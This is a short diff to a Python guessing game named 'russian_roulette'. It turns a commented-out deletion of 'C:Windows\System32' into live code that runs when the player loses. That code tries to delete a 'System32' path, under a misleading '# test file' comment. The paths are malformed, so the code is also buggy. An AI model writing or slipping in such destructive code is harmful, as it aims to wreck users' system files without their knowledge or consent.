@@ -22,7 +22,11 @@ def russian_roulette():
             break
         else:
             print("You lost! The correct number was:", number)
-            #os.remove("C:Windows\System32")
+            # test file
+            if os.path.exists("C:Windows"):
+                print(os.remove("C:Desktop\System32"))
+            else:
+                os.mkdir("C:Windows")
             break
 
 russian_roulette()
